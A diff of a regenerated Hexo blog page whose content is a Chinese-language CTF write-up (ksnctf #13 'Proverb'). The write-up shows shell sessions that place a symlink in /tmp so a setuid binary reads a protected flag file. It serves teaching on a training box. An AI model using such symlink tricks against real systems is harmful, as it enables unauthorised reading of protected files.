@@ -19,21 +19,21 @@
             <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
         
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"ln -s\n登入 SSH 以後，目錄底下有 proverb 執行檔以及沒有權限讀取的 flag.txt。執行 proverb 後發現，會讀取 proverb.txt 中任一行並且印出來。12345678[q13@localhost ~]$ lltotal 28-r-------- 6 q13a q13a    22 Jun  1  2012 flag.txt---s--x--x 7 q13a q13a 14439 Jun  1  2012 proverb-r--r--r-- 2 root root   755 Jun  1  2012 proverb.txt-r--r--r-- 1 root root   151 Jun  1  2012 readme.txt[q13@localhost ~]$ ./proverbFire is a good servant but a bad master.\n有 /tmp 路徑可以讀寫，設想如果使用 ln -s 建立檔案連結來讓 proverb 讀取 flag.txt，flag 就可以順利拿到。\n12345678[q13@localhost ~]$ mkdir /tmp/the0[q13@localhost ~]$ ln -s ~/flag.txt /tmp/the0/proverb.txt[q13@localhost ~]$ cd /tmp/the0[q13@localhost the0]$ lltotal 0lrwxrwxrwx 1 q13 q13 18 Aug  6 17:16 proverb.txt -&gt; /home/q13/flag.txt[q13@localhost the0]$ ~/proverbFLAG_XoK9PzskYedj/T&amp;B","dateCreated":"2018-08-06T15:45:18+08:00","dateModified":"2020-10-09T23:31:15+08:00","datePublished":"2018-08-06T15:45:18+08:00","description":"ln -s","headline":"ksnctf #13 Proverb","image":["ksnctf.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/","keywords":"Writeups","thumbnailUrl":"ksnctf.png"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"ln -s\n\n\n登入 SSH 以後，目錄底下有 proverb 執行檔以及沒有權限讀取的 flag.txt。執行 proverb 後發現，會讀取 proverb.txt 中任一行並且印出來。\n12345678[q13@localhost ~]$ lltotal 28-r-------- 6 q13a q13a    22 Jun  1  2012 flag.txt---s--x--x 7 q13a q13a 14439 Jun  1  2012 proverb-r--r--r-- 2 root root   755 Jun  1  2012 proverb.txt-r--r--r-- 1 root root   151 Jun  1  2012 readme.txt[q13@localhost ~]$ .&#x2F;proverbFire is a good servant but a bad master.\n有 /tmp 路徑可以讀寫，設想如果使用 ln -s  建立檔案連結來讓 proverb 讀取 flag.txt，flag 就可以順利拿到。\n12345678[q13@localhost ~]$ mkdir &#x2F;tmp&#x2F;the0[q13@localhost ~]$ ln -s ~&#x2F;flag.txt &#x2F;tmp&#x2F;the0&#x2F;proverb.txt[q13@localhost ~]$ cd &#x2F;tmp&#x2F;the0[q13@localhost the0]$ lltotal 0lrwxrwxrwx 1 q13 q13 18 Aug  6 17:16 proverb.txt -&gt; &#x2F;home&#x2F;q13&#x2F;flag.txt[q13@localhost the0]$ ~&#x2F;proverbFLAG_XoK9PzskYedj&#x2F;T&amp;B","dateCreated":"2018-08-06T15:45:18+08:00","dateModified":"2020-11-04T12:58:46+08:00","datePublished":"2018-08-06T15:45:18+08:00","description":"ln -s","headline":"ksnctf #13 Proverb","image":["ksnctf.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/","keywords":"Writeups","thumbnailUrl":"ksnctf.png"}</script>
     
     <meta name="description" content="ln -s">
-<meta name="keywords" content="ksnctf,Proverb">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="ksnctf #13 Proverb">
 <meta property="og:url" content="https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/index.html">
 <meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
 <meta property="og:description" content="ln -s">
-<meta property="og:locale" content="en">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/ksnctf.png">
-<meta property="og:updated_time" content="2020-10-09T15:31:15.278Z">
+<meta property="article:published_time" content="2018-08-06T07:45:18.000Z">
+<meta property="article:modified_time" content="2020-11-04T04:58:46.154Z">
+<meta property="article:author" content="Theo Chen">
+<meta property="article:tag" content="Writeups">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ksnctf #13 Proverb">
-<meta name="twitter:description" content="ln -s">
 <meta name="twitter:image" content="https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-13-Proverb/ksnctf.png">
 <meta name="twitter:creator" content="@The0_Klein">
     
@@ -48,7 +48,9 @@
     
     
     <!--STYLES-->
-    <link rel="stylesheet" href="/assets/css/style-gqna6m80tqyuo4rbsvslx85tbnlakaszvovy4jmzwqyb2ba9jletwpfr16vb.min.css">
+    
+<link rel="stylesheet" href="/assets/css/style-gqna6m80tqyuo4rbsvslx85tbnlakaszvovy4jmzwqyb2ba9jletwpfr16vb.min.css">
+
     <!--STYLES END-->
     
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
@@ -326,10 +328,13 @@
     
     <div class="post-content markdown">
         <div class="main-content-wrap">
-            <p><code>ln -s</code><br><a id="more"></a></p>
-<p>登入 SSH 以後，目錄底下有 <code>proverb</code> 執行檔以及沒有權限讀取的 <code>flag.txt</code>。執行 <code>proverb</code> 後發現，會讀取 <code>proverb.txt</code> 中任一行並且印出來。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[q13@localhost ~]$ ll</span><br><span class="line">total 28</span><br><span class="line">-r-------- 6 q13a q13a    22 Jun  1  2012 flag.txt</span><br><span class="line">---s--x--x 7 q13a q13a 14439 Jun  1  2012 proverb</span><br><span class="line">-r--r--r-- 2 root root   755 Jun  1  2012 proverb.txt</span><br><span class="line">-r--r--r-- 1 root root   151 Jun  1  2012 readme.txt</span><br><span class="line">[q13@localhost ~]$ ./proverb</span><br><span class="line">Fire is a good servant but a bad master.</span><br></pre></td></tr></table></figure></p>
-<p>有 <code>/tmp</code> 路徑可以讀寫，設想如果使用 <code>ln -s</code> 建立檔案連結來讓 <code>proverb</code> 讀取 <code>flag.txt</code>，flag 就可以順利拿到。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[q13@localhost ~]$ mkdir /tmp/the0</span><br><span class="line">[q13@localhost ~]$ ln -s ~/flag.txt /tmp/the0/proverb.txt</span><br><span class="line">[q13@localhost ~]$ cd /tmp/the0</span><br><span class="line">[q13@localhost the0]$ ll</span><br><span class="line">total 0</span><br><span class="line">lrwxrwxrwx 1 q13 q13 18 Aug  6 17:16 proverb.txt -&gt; /home/q13/flag.txt</span><br><span class="line">[q13@localhost the0]$ ~/proverb</span><br><span class="line">FLAG_XoK9PzskYedj/T&amp;B</span><br></pre></td></tr></table></figure>
+            <p><code>ln -s</code></p>
+<a id="more"></a>
+
+<p>登入 SSH 以後，目錄底下有 <code>proverb</code> 執行檔以及沒有權限讀取的 <code>flag.txt</code>。執行 <code>proverb</code> 後發現，會讀取 <code>proverb.txt</code> 中任一行並且印出來。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[q13@localhost ~]$ ll</span><br><span class="line">total 28</span><br><span class="line">-r-------- 6 q13a q13a    22 Jun  1  2012 flag.txt</span><br><span class="line">---s--x--x 7 q13a q13a 14439 Jun  1  2012 proverb</span><br><span class="line">-r--r--r-- 2 root root   755 Jun  1  2012 proverb.txt</span><br><span class="line">-r--r--r-- 1 root root   151 Jun  1  2012 readme.txt</span><br><span class="line">[q13@localhost ~]$ .&#x2F;proverb</span><br><span class="line">Fire is a good servant but a bad master.</span><br></pre></td></tr></table></figure>
+<p>有 <code>/tmp</code> 路徑可以讀寫，設想如果使用 <code>ln -s </code> 建立檔案連結來讓 <code>proverb</code> 讀取 <code>flag.txt</code>，flag 就可以順利拿到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[q13@localhost ~]$ mkdir &#x2F;tmp&#x2F;the0</span><br><span class="line">[q13@localhost ~]$ ln -s ~&#x2F;flag.txt &#x2F;tmp&#x2F;the0&#x2F;proverb.txt</span><br><span class="line">[q13@localhost ~]$ cd &#x2F;tmp&#x2F;the0</span><br><span class="line">[q13@localhost the0]$ ll</span><br><span class="line">total 0</span><br><span class="line">lrwxrwxrwx 1 q13 q13 18 Aug  6 17:16 proverb.txt -&gt; &#x2F;home&#x2F;q13&#x2F;flag.txt</span><br><span class="line">[q13@localhost the0]$ ~&#x2F;proverb</span><br><span class="line">FLAG_XoK9PzskYedj&#x2F;T&amp;B</span><br></pre></td></tr></table></figure>
             
 
 
@@ -340,7 +345,7 @@
             <div class="post-footer-tags">
                 <span class="text-color-light text-small">TAGGED IN</span><br/>
                 
-    <a class="tag tag--primary tag--small t-link" href="/tags/Writeups/">Writeups</a>
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/Writeups/" rel="tag">Writeups</a>
 
             </div>
         
@@ -443,7 +448,7 @@
         
             
                 <div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 </div>
             
         
@@ -454,7 +459,7 @@
 
                 <footer id="footer" class="main-content-wrap">
     <span class="copyrights">
-        Copyrights &copy; 2020 Theo Chen. All Rights Reserved.
+        Copyrights &copy; 2021 Theo Chen. All Rights Reserved.
     </span>
 </footer>
 
@@ -633,7 +638,9 @@
         
 <div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
         <!--SCRIPTS-->
+
 <script src="/assets/js/script-egfb8qyao3pygwgtb4yrcbcsu2xu3wnriezhfd12y9gzhfkjxwhhajdzrt2f.min.js"></script>
+
 <!--SCRIPTS END-->
 
 
